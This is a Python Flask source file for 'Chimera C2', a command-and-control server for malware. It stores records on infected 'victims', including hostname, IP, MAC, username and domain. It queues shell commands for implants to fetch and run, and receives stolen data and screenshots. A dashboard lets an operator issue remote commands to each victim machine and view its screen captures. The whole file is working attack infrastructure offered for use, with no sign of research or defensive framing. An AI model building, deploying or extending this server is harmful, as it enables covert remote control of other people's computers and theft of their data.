
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
import json
import secrets
import logging

# ============================================
# LOGGING
# ============================================

logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s: %(message)s'
)

app = Flask(__name__)
app.config['SECRET_KEY'] = secrets.token_hex(32)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///c2_database.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

# ============================================
# MODELS
# ============================================

class Victim(db.Model):
    __tablename__ = 'victims'
    id = db.Column(db.Integer, primary_key=True)
    victim_id = db.Column(db.String(128), unique=True, nullable=False)
    hostname = db.Column(db.String(100))
    ip = db.Column(db.String(50))
    mac = db.Column(db.String(50))
    os = db.Column(db.String(100))
    os_version = db.Column(db.String(200))
    architecture = db.Column(db.String(50))
    cpu = db.Column(db.String(100))
    memory = db.Column(db.String(50))
    disk = db.Column(db.String(200))
    username = db.Column(db.String(100))
    domain = db.Column(db.String(100))
    first_seen = db.Column(db.DateTime, default=datetime.now)
    last_seen = db.Column(db.DateTime, default=datetime.now)
    status = db.Column(db.String(50), default='active')

class Command(db.Model):
    __tablename__ = 'commands'
    id = db.Column(db.Integer, primary_key=True)
    victim_id = db.Column(db.String(128), nullable=False)
    command = db.Column(db.Text, nullable=False)
    status = db.Column(db.String(50), default='pending')
    result = db.Column(db.Text)
    issued_at = db.Column(db.DateTime, default=datetime.now)
    executed_at = db.Column(db.DateTime)

class CollectedData(db.Model):
    __tablename__ = 'collected_data'
    id = db.Column(db.Integer, primary_key=True)
    victim_id = db.Column(db.String(128), nullable=False)
    data_type = db.Column(db.String(50))
    content = db.Column(db.Text)
    timestamp = db.Column(db.DateTime, default=datetime.now)

# ============================================
# CREATE TABLES
# ============================================

with app.app_context():
    db.create_all()
    logging.info("Database initialized")

# ============================================
# HTML DASHBOARD - IMPROVED
# ============================================

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chimera C2 Dashboard</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: #0a0e1a;
            color: #e0e0e0;
            padding: 20px;
            min-height: 100vh;
        }
        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-track { background: #0a0e1a; }
        ::-webkit-scrollbar-thumb { background: #2a2f4a; border-radius: 3px; }
        ::-webkit-scrollbar-thumb:hover { background: #00ff88; }

        /* Header */
        .header {
            background: linear-gradient(135deg, #1a1f3a 0%, #0d1225 100%);
            padding: 20px 30px;
            border-radius: 16px;
            border: 1px solid #2a2f4a;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 15px;
            margin-bottom: 25px;
            box-shadow: 0 4px 30px rgba(0,0,0,0.3);
        }
        .header-left h1 {
            font-size: 26px;
            font-weight: 800;
            background: linear-gradient(90deg, #00ff88, #00cc66);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .header-left .subtitle { color: #666; font-size: 13px; margin-top: 4px; }
        .header-stats {
            display: flex;
            gap: 30px;
            flex-wrap: wrap;
        }
        .stat-item {
            text-align: center;
        }
        .stat-item .number {
            font-size: 28px;
            font-weight: 700;
            color: #00ff88;
        }
        .stat-item .label {
            font-size: 12px;
            color: #666;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .stat-item .number.pending { color: #ffd700; }
        .stat-item .number.active { color: #00ff88; }
        .stat-item .number.data { color: #00b4ff; }

        .header-actions {
            display: flex;
            gap: 10px;
            align-items: center;
        }
        .btn-refresh {
            background: #00ff88;
            color: #0a0e1a;
            border: none;
            padding: 10px 25px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 700;
            font-size: 14px;
            transition: all 0.3s;
        }
        .btn-refresh:hover { transform: scale(1.05); box-shadow: 0 0 20px rgba(0,255,136,0.3); }
        .refresh-time { color: #555; font-size: 12px; }

        /* Cards */
        .victim-card {
            background: linear-gradient(135deg, #1a1f3a 0%, #0d1225 100%);
            border-radius: 16px;
            padding: 20px 25px;
            margin: 12px 0;
            border: 1px solid #2a2f4a;
            transition: all 0.3s;
        }
        .victim-card:hover { border-color: #00ff88; box-shadow: 0 0 30px rgba(0,255,136,0.05); }

        .victim-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 10px;
            margin-bottom: 10px;
        }
        .victim-id {
            font-size: 18px;
            font-weight: 700;
            color: #00ff88;
        }
        .victim-status {
            padding: 4px 14px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            background: rgba(0,255,136,0.15);
            color: #00ff88;
            border: 1px solid rgba(0,255,136,0.3);
        }
        .victim-status.offline {
            background: rgba(255,0,68,0.15);
            color: #ff0044;
            border-color: rgba(255,0,68,0.3);
        }
        .victim-details {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 8px;
            margin: 8px 0;
        }
        .victim-details .detail {
            font-size: 13px;
            color: #888;
        }
        .victim-details .detail span {
            color: #e0e0e0;
            font-weight: 500;
        }

        .command-box {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin-top: 12px;
        }
        .command-box input {
            flex: 1;
            min-width: 200px;
            padding: 10px 16px;
            background: #0a0e1a;
            border: 1px solid #2a2f4a;
            border-radius: 8px;
            color: #e0e0e0;
            font-size: 14px;
            transition: 0.3s;
        }
        .command-box input:focus {
            outline: none;
            border-color: #00ff88;
        }
        .command-box input::placeholder { color: #444; }

        .btn {
            padding: 10px 20px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
            font-size: 13px;
            transition: all 0.3s;
        }
        .btn:hover { transform: scale(1.02); }
        .btn-go { background: #00ff88; color: #0a0e1a; }
        .btn-go:hover { box-shadow: 0 0 20px rgba(0,255,136,0.2); }
        .btn-data { background: #2a2f4a; color: #fff; }
        .btn-data:hover { background: #3a3f5a; }
        .btn-screenshot {
            background: linear-gradient(135deg, #ffd700, #ffaa00);
            color: #0a0e1a;
        }
        .btn-screenshot:hover { box-shadow: 0 0 20px rgba(255,215,0,0.2); }

        .result {
            padding: 10px 14px;
            margin-top: 8px;
            border-radius: 8px;
            font-size: 13px;
            background: #0a0e1a;
            border-left: 3px solid;
            display: none;
        }
        .result.visible { display: block; }
        .result.success { border-color: #00ff88; color: #00ff88; }
        .result.pending { border-color: #ffd700; color: #ffd700; }
        .result.error { border-color: #ff0044; color: #ff0044; }

        .preview {
            background: #0a0e1a;
            padding: 12px;
            margin-top: 10px;
            border-radius: 8px;
            max-height: 300px;
            overflow: auto;
            font-size: 12px;
            font-family: 'Courier New', monospace;
            color: #888;
            white-space: pre-wrap;
            display: none;
            border: 1px solid #1a1f3a;
        }
        .preview.visible { display: block; }

        .screenshot-img {
            max-width: 100%;
            max-height: 500px;
            border-radius: 8px;
            margin-top: 10px;
            border: 1px solid #2a2f4a;
        }
        .screenshot-info {
            color: #666;
            font-size: 11px;
            margin-top: 5px;
        }

        /* Live Stream */
        .live-stream {
            background: linear-gradient(135deg, #1a1f3a 0%, #0d1225 100%);
            border-radius: 16px;
            padding: 15px 20px;
            margin-top: 25px;
            border: 1px solid #2a2f4a;
            max-height: 200px;
            overflow-y: auto;
        }
        .live-stream .title {
            color: #666;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 10px;
        }
        .live-entry {
            padding: 4px 10px;
            border-bottom: 1px solid #1a1f3a;
            font-size: 13px;
            color: #888;
            display: flex;
            gap: 15px;
            align-items: center;
        }
        .live-entry .time { color: #444; font-size: 11px; min-width: 70px; }
        .live-entry .type {
            color: #ffd700;
            font-weight: 600;
            min-width: 80px;
        }
        .live-entry .type.screenshot { color: #ffaa00; }
        .live-entry .type.command { color: #00b4ff; }
        .live-entry .type.result { color: #00ff88; }
        .live-entry .type.system { color: #888; }

        .debug-info {
            color: #555;
            font-size: 12px;
            margin-top: 15px;
            padding: 10px;
            background: #0a0e1a;
            border-radius: 8px;
            border: 1px solid #1a1f3a;
        }

        .no-victims {
            text-align: center;
            padding: 60px 20px;
            color: #444;
        }
        .no-victims .icon { font-size: 48px; margin-bottom: 15px; }
        .no-victims h3 { color: #555; margin-bottom: 5px; }
        .no-victims p { color: #333; }

        @media (max-width: 768px) {
            .header { flex-direction: column; text-align: center; }
            .header-stats { justify-content: center; }
            .header-actions { width: 100%; justify-content: center; }
            .victim-details { grid-template-columns: 1fr; }
            .command-box { flex-direction: column; }
            .command-box input { width: 100%; }
        }
    </style>
</head>
<body>

<div class="header">
    <div class="header-left">
        <h1>🎯 Chimera C2</h1>
        <div class="subtitle">Command & Control Dashboard</div>
    </div>
    <div class="header-stats">
        <div class="stat-item">
            <div class="number" id="total">0</div>
            <div class="label">Total Victims</div>
        </div>
        <div class="stat-item">
            <div class="number active" id="active">0</div>
            <div class="label">Active</div>
        </div>
        <div class="stat-item">
            <div class="number pending" id="pending">0</div>
            <div class="label">Pending</div>
        </div>
        <div class="stat-item">
            <div class="number data" id="dataCount">0</div>
            <div class="label">Data Points</div>
        </div>
    </div>
    <div class="header-actions">
        <button class="btn-refresh" onclick="refresh()">🔄 Refresh</button>
        <span class="refresh-time" id="refreshTime">Never</span>
    </div>
</div>

<div id="victimsContainer"></div>

<div class="live-stream" id="liveStream">
    <div class="title">📡 Live Events</div>
    <div class="live-entry" style="color:#333;">Waiting for events...</div>
</div>

<div class="debug-info" id="debugInfo">💡 Click Refresh to load data</div>

<script>
// ============================================
// STATE
// ============================================
let victimsData = [];

// ============================================
// REFRESH
// ============================================
function refresh() {
    document.getElementById('debugInfo').textContent = '🔄 Loading...';
    document.getElementById('refreshTime').textContent = new Date().toLocaleTimeString();

    Promise.all([
        fetch('/api/victims').then(r => r.json()),
        fetch('/api/stats').then(r => r.json())
    ])
    .then(([victimsData, stats]) => {
        victimsData = victimsData.victims || [];
        updateStats(victimsData, stats);
        renderVictims(victimsData);
        document.getElementById('debugInfo').textContent = '✅ Updated at ' + new Date().toLocaleTimeString();
        addLiveEntry('system', '🔄 Data refreshed');
    })
    .catch(e => {
        document.getElementById('debugInfo').textContent = '❌ Error: ' + e.message;
    });
}

function updateStats(victims, stats) {
    document.getElementById('total').textContent = victims.length;
    document.getElementById('active').textContent = victims.filter(v => v.status === 'active').length;
    document.getElementById('pending').textContent = stats.pending_commands || 0;
    document.getElementById('dataCount').textContent = stats.total_data || 0;
}

function renderVictims(victims) {
    const container = document.getElementById('victimsContainer');
    if (victims.length === 0) {
        container.innerHTML = `
            <div class="no-victims">
                <div class="icon">🕵️</div>
                <h3>No Victims Connected</h3>
                <p>Waiting for payloads to call home...</p>
            </div>
        `;
        return;
    }

    container.innerHTML = victims.map(v => {
        const isActive = v.status === 'active';
        return `
            <div class="victim-card">
                <div class="victim-header">
                    <span class="victim-id">🖥️ ${v.id}</span>
                    <span class="victim-status ${isActive ? '' : 'offline'}">${isActive ? '● ONLINE' : '● OFFLINE'}</span>
                </div>
                <div class="victim-details">
                    <div class="detail">🏷️ Hostname: <span>${v.hostname || 'Unknown'}</span></div>
                    <div class="detail">🌐 IP: <span>${v.ip || 'Unknown'}</span></div>
                    <div class="detail">📶 MAC: <span>${v.mac || 'N/A'}</span></div>
                    <div class="detail">🖥️ OS: <span>${v.os || 'Unknown'}</span></div>
                    <div class="detail">🔧 Arch: <span>${v.architecture || 'Unknown'}</span></div>
                    <div class="detail">💾 CPU: <span>${v.cpu || 'Unknown'}</span></div>
                    <div class="detail">🧠 RAM: <span>${v.memory || 'Unknown'}</span></div>
                    <div class="detail">💽 Disk: <span>${v.disk || 'Unknown'}</span></div>
                    <div class="detail">👤 User: <span>${v.username || 'Unknown'}</span></div>
                    <div class="detail">🏢 Domain: <span>${v.domain || 'Unknown'}</span></div>
                </div>
                <div class="detail" style="font-size:12px;color:#444;margin-top:5px;">
                    🕐 First: ${new Date(v.first_seen).toLocaleString()} | Last: ${new Date(v.last_seen).toLocaleString()}
                </div>

                <div class="command-box">
                    <input type="text" id="cmd_${v.id}" placeholder="Enter command..." onkeypress="if(event.key==='Enter') exec('${v.id}')">
                    <button class="btn btn-go" onclick="exec('${v.id}')">▶ Run</button>
                    <button class="btn btn-data" onclick="viewData('${v.id}')">📁 Data</button>
                    <button class="btn btn-screenshot" onclick="getScreenshot('${v.id}')">📸 Screenshot</button>
                </div>

                <div id="result_${v.id}" class="result"></div>
                <div id="data_${v.id}" class="preview">📂 Loading data...</div>
                <div id="screenshot_${v.id}" class="preview">🖼️ Loading screenshot...</div>
            </div>
        `;
    }).join('');
}

// ============================================
// EXECUTE COMMAND
// ============================================
function exec(victimId) {
    const cmd = document.getElementById(`cmd_${victimId}`).value.trim();
    if (!cmd) { alert('Enter a command'); return; }

    const resultDiv = document.getElementById(`result_${victimId}`);
    resultDiv.textContent = '⏳ Sending...';
    resultDiv.className = 'result visible pending';

    fetch('/api/send_command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ victim_id: victimId, command: cmd })
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === 'queued') {
            resultDiv.textContent = '✅ Command sent! Waiting for execution...';
            resultDiv.className = 'result visible success';
            document.getElementById(`cmd_${victimId}`).value = '';
            addLiveEntry('command', `Command sent: ${cmd}`);
            setTimeout(() => checkResult(victimId, data.command_id), 8000);
        } else {
            resultDiv.textContent = '❌ Error: ' + (data.message || 'Unknown');
            resultDiv.className = 'result visible error';
        }
    })
    .catch(e => {
        resultDiv.textContent = '❌ Error: ' + e.message;
        resultDiv.className = 'result visible error';
    });
}

function checkResult(victimId, cmdId) {
    fetch(`/api/victim/${victimId}`)
        .then(r => r.json())
        .then(data => {
            const cmd = (data.commands || []).find(c => c.id === cmdId);
            const resultDiv = document.getElementById(`result_${victimId}`);
            if (cmd && cmd.status === 'executed') {
                let output = cmd.result || 'No output';
                try { output = JSON.parse(output).result || output; } catch(e) {}
                resultDiv.textContent = '✅ Result: ' + output;
                resultDiv.className = 'result visible success';
                addLiveEntry('result', 'Command executed: ' + cmd.command);
            } else if (cmd && cmd.status === 'pending') {
                resultDiv.textContent = '⏳ Still pending... retrying in 5s';
                resultDiv.className = 'result visible pending';
                setTimeout(() => checkResult(victimId, cmdId), 5000);
            } else {
                resultDiv.textContent = '⚠️ No result yet';
                resultDiv.className = 'result visible pending';
            }
        });
}

// ============================================
// VIEW DATA
// ============================================
function viewData(victimId) {
    const div = document.getElementById(`data_${victimId}`);
    if (div.classList.contains('visible')) {
        div.classList.remove('visible');
        return;
    }
    div.classList.add('visible');
    div.textContent = '🔄 Loading...';
    fetch(`/api/victim/${victimId}`)
        .then(r => r.json())
        .then(data => {
            div.textContent = JSON.stringify(data, null, 2);
        });
}

// ============================================
// GET SCREENSHOT
// ============================================
function getScreenshot(victimId) {
    const div = document.getElementById(`screenshot_${victimId}`);
    if (div.classList.contains('visible')) {
        div.classList.remove('visible');
        return;
    }
    div.classList.add('visible');
    div.innerHTML = '🔄 Loading screenshot...';

    fetch(`/api/victim/${victimId}`)
        .then(r => r.json())
        .then(data => {
            const screenshots = (data.data || []).filter(d => d.type === 'screenshot');
            if (screenshots.length > 0) {
                const last = screenshots[0];
                const img = last.content.image;
                div.innerHTML = `
                    <img src="data:image/png;base64,${img}" class="screenshot-img">
                    <div class="screenshot-info">
                        📸 Size: ${Math.round(last.content.size / 1024)} KB | 
                        🕐 ${new Date(last.timestamp).toLocaleString()}
                    </div>
                `;
                addLiveEntry('screenshot', '📸 Screenshot loaded');
            } else {
                div.innerHTML = '📸 No screenshots available';
            }
        });
}

// ============================================
// LIVE STREAM
// ============================================
function addLiveEntry(type, message) {
    const stream = document.getElementById('liveStream');
    if (stream.children.length === 1 && stream.children[0].textContent.includes('Waiting')) {
        stream.innerHTML = '';
    }
    const entry = document.createElement('div');
    entry.className = 'live-entry';
    const time = new Date().toLocaleTimeString();
    entry.innerHTML = `
        <span class="time">${time}</span>
        <span class="type ${type}">[${type}]</span>
        <span>${message}</span>
    `;
    stream.prepend(entry);
    while (stream.children.length > 30) {
        stream.removeChild(stream.lastChild);
    }
}

// ============================================
// AUTO REFRESH (Every 10 seconds for screenshot updates)
// ============================================
function autoRefresh() {
    // Only refresh victim list to get new data, but keep page state
    fetch('/api/victims')
        .then(r => r.json())
        .then(data => {
            victimsData = data.victims || [];
            // Update stats only, don't re-render to keep UI state
            fetch('/api/stats')
                .then(r => r.json())
                .then(stats => {
                    document.getElementById('total').textContent = victimsData.length;
                    document.getElementById('active').textContent = victimsData.filter(v => v.status === 'active').length;
                    document.getElementById('pending').textContent = stats.pending_commands || 0;
                    document.getElementById('dataCount').textContent = stats.total_data || 0;
                });
        })
        .catch(() => {});
}

// ============================================
// INIT
// ============================================
refresh();

// Auto-refresh in background every 10 seconds (only stats, not page)
setInterval(autoRefresh, 10000);

console.log('🎯 Chimera C2 Dashboard loaded');
</script>
</body>
</html>
'''

# ============================================
# ROUTES
# ============================================

@app.route('/')
@app.route('/dashboard')
def dashboard():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/register', methods=['POST'])
def register():
    try:
        data = request.json
        vid = data.get('victim_id')
        
        logging.info(f"Register request: {vid}")
        
        if not vid:
            return jsonify({'status': 'error'}), 400
        
        v = Victim.query.filter_by(victim_id=vid).first()
        if v:
            v.last_seen = datetime.now()
            v.ip = data.get('ip', v.ip)
            v.mac = data.get('mac', v.mac)
            v.hostname = data.get('hostname', v.hostname)
            v.os = data.get('os', v.os)
            v.os_version = data.get('os_version', v.os_version)
            v.architecture = data.get('architecture', v.architecture)
            v.cpu = data.get('cpu', v.cpu)
            v.memory = data.get('memory', v.memory)
            v.disk = data.get('disk', v.disk)
            v.username = data.get('username', v.username)
            v.domain = data.get('domain', v.domain)
            v.status = 'active'
            logging.info(f"Updated victim: {vid}")
        else:
            v = Victim(
                victim_id=vid,
                hostname=data.get('hostname', 'Unknown'),
                ip=data.get('ip', 'Unknown'),
                mac=data.get('mac', 'Unknown'),
                os=data.get('os', 'Unknown'),
                os_version=data.get('os_version', 'Unknown'),
                architecture=data.get('architecture', 'Unknown'),
                cpu=data.get('cpu', 'Unknown'),
                memory=data.get('memory', 'Unknown'),
                disk=data.get('disk', 'Unknown'),
                username=data.get('username', 'Unknown'),
                domain=data.get('domain', 'Unknown'),
                status='active'
            )
            db.session.add(v)
            logging.info(f"New victim: {vid}")
        
        db.session.commit()
        return jsonify({'status': 'registered'})
    except Exception as e:
        logging.error(f"Register error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/collect', methods=['POST'])
def collect():
    try:
        data = request.json
        vid = data.get('victim_id')
        data_type = data.get('type')
        
        if not vid:
            return jsonify({'status': 'error'}), 400
        
        v = Victim.query.filter_by(victim_id=vid).first()
        if v:
            v.last_seen = datetime.now()
            db.session.commit()
        
        c = CollectedData(
            victim_id=vid,
            data_type=data_type,
            content=json.dumps(data.get('content', {}), default=str),
            timestamp=datetime.now()
        )
        db.session.add(c)
        db.session.commit()
        
        logging.info(f"Data from {vid}: {data_type}")
        return jsonify({'status': 'received'})
    except Exception as e:
        logging.error(f"Collect error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/get_command', methods=['POST'])
def get_command():
    try:
        data = request.json
        vid = data.get('victim_id')
        
        if not vid:
            return jsonify({'status': 'error'}), 400
        
        cmd = Command.query.filter_by(victim_id=vid, status='pending').first()
        
        if cmd:
            logging.info(f"Command sent to {vid}: {cmd.command[:50]}")
            return jsonify({
                'has_command': True,
                'command': cmd.command,
                'command_id': cmd.id
            })
        return jsonify({'has_command': False})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/command_result', methods=['POST'])
def command_result():
    try:
        data = request.json
        cmd_id = data.get('command_id')
        result = data.get('result')
        
        cmd = Command.query.get(cmd_id)
        if cmd:
            cmd.status = 'executed'
            cmd.result = json.dumps(result, default=str) if result else '{}'
            cmd.executed_at = datetime.now()
            db.session.commit()
            logging.info(f"Command {cmd_id} executed")
        
        return jsonify({'status': 'updated'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/send_command', methods=['POST'])
def send_command():
    try:
        data = request.json
        vid = data.get('victim_id')
        cmd_text = data.get('command')
        
        if not vid or not cmd_text:
            return jsonify({'status': 'error'}), 400
        
        cmd = Command(victim_id=vid, command=cmd_text, status='pending')
        db.session.add(cmd)
        db.session.commit()
        logging.info(f"Command queued: {cmd_text[:50]}")
        return jsonify({'status': 'queued', 'command_id': cmd.id})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/victims', methods=['GET'])
def get_victims():
    try:
        victims = Victim.query.order_by(Victim.last_seen.desc()).all()
        return jsonify({'victims': [
            {
                'id': v.victim_id,
                'hostname': v.hostname,
                'ip': v.ip,
                'mac': v.mac,
                'os': v.os,
                'os_version': v.os_version,
                'architecture': v.architecture,
                'cpu': v.cpu,
                'memory': v.memory,
                'disk': v.disk,
                'username': v.username,
                'domain': v.domain,
                'first_seen': v.first_seen.isoformat() if v.first_seen else None,
                'last_seen': v.last_seen.isoformat() if v.last_seen else None,
                'status': v.status
            } for v in victims
        ]})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/victim/<victim_id>', methods=['GET'])
def get_victim(victim_id):
    try:
        v = Victim.query.filter_by(victim_id=victim_id).first()
        if not v:
            return jsonify({'error': 'Victim not found'}), 404
        
        data = CollectedData.query.filter_by(victim_id=victim_id).order_by(
            CollectedData.timestamp.desc()).limit(50).all()
        cmds = Command.query.filter_by(victim_id=victim_id).order_by(
            Command.issued_at.desc()).limit(20).all()
        
        return jsonify({
            'victim': {
                'id': v.victim_id,
                'hostname': v.hostname,
                'ip': v.ip,
                'mac': v.mac,
                'os': v.os,
                'os_version': v.os_version,
                'architecture': v.architecture,
                'cpu': v.cpu,
                'memory': v.memory,
                'disk': v.disk,
                'username': v.username,
                'domain': v.domain,
                'status': v.status
            },
            'data': [
                {
                    'id': d.id,
                    'type': d.data_type,
                    'content': json.loads(d.content) if d.content else {},
                    'timestamp': d.timestamp.isoformat() if d.timestamp else None
                } for d in data
            ],
            'commands': [
                {
                    'id': c.id,
                    'command': c.command,
                    'status': c.status,
                    'result': c.result,
                    'issued_at': c.issued_at.isoformat() if c.issued_at else None,
                    'executed_at': c.executed_at.isoformat() if c.executed_at else None
                } for c in cmds
            ]
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/stats', methods=['GET'])
def get_stats():
    try:
        return jsonify({
            'total_victims': Victim.query.count(),
            'active_victims': Victim.query.filter_by(status='active').count(),
            'pending_commands': Command.query.filter_by(status='pending').count(),
            'total_data': CollectedData.query.count()
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    logging.info("=" * 60)
    logging.info("Chimera C2 Server - Enhanced")
    logging.info("=" * 60)
    app.run(host='0.0.0.0', port=8080, debug=False)

